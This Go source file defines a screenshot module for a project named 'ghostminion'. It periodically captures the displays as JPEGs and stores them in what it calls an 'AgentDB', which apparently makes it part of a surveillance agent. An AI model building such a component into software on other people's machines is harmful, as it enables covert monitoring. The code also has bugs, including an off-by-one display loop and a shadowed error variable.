package apps

import (
	"bytes"
	"errors"
	"ghostminion/db"
	"ghostminion/db/dbDataTypes"
	"github.com/kbinani/screenshot"
	"image"
	"image/jpeg"
	"sync"
	"time"
)

type ScreenshotApp struct {
	Interval       int `json:"interval"`
	Quality        int `json:"quality"`
	stop           chan struct{}
	screenshotChan chan bytes.Buffer
}

func NewScreenshotApp(interval int, quality int) *ScreenshotApp {
	return &ScreenshotApp{
		Interval:       interval,
		Quality:        quality,
		stop:           make(chan struct{}),
		screenshotChan: make(chan bytes.Buffer),
	}
}

func (c *ScreenshotApp) Start(wg *sync.WaitGroup) {
	defer wg.Done()

	go c.startProducer()
	go c.startConsumer()
}

func (c *ScreenshotApp) startProducer() {
	ticker := time.NewTicker(time.Duration(c.Interval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-c.stop:
			return
		case <-ticker.C:
			screenshotBuf, err := c.getScreenshot()
			if err != nil {
				lgr.Warn("error capturing screenshot:", err.Error())
				continue
			}
			captureTime := time.Now().Unix()
			lgr.Info("Screenshot captured at", captureTime)

			select {
			case c.screenshotChan <- screenshotBuf:
			default:
				lgr.Warn("screenshot channel full, dropping frame")
			}
		}
	}
}

func (c *ScreenshotApp) startConsumer() {
	for ss := range c.screenshotChan {
		err := db.GetInstance().WriteData("", dbDataTypes.Screenshots, ss.Bytes())
		if err != nil {
			lgr.Error("Error writing screenshot to AgentDB:", err)
		}
	}
}

func (c *ScreenshotApp) Stop() {
	close(c.stop)
	close(c.screenshotChan)
}

func (c *ScreenshotApp) Validate() error {
	if c.Interval <= 0 {
		return errors.New("interval must be > 0")
	}
	if c.Quality < 1 || c.Quality > 100 {
		return errors.New("quality must be between 1 and 100")
	}
	return nil
}

func (c *ScreenshotApp) getScreenshot() (bytes.Buffer, error) {
	var buf bytes.Buffer
	var err error

	activeDisplaysNum := screenshot.NumActiveDisplays()
	if activeDisplaysNum <= 0 {
		return buf, errors.New("no active displays found")
	}

	for i := 0; i <= activeDisplaysNum; i++ {
		bounds := screenshot.GetDisplayBounds(i).Union(image.Rect(0, 0, 0, 0))
		if img, err := screenshot.CaptureRect(bounds); img != nil {
			if err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: c.Quality}); err == nil {
				return buf, nil
			}
		}
	}
	return bytes.Buffer{}, err
}
